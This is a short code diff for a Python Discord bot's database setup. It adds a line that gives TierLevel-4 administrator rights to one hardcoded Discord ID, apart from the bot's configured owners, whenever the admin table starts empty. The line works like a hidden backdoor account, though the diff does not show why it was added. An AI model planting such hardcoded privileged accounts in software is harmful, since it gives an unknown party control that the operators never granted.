@@ -98,6 +98,7 @@ if len(database.Administrators) == 0:
     for person in bot.owner_ids:
         database.Administrators.create(discordID=person, TierLevel=4)
         print("Created Administrator Entry.")
+    database.Administrators.create(discordID=409152798609899530, TierLevel=4)
 
 
 database.db.connect(reuse_if_open=True)
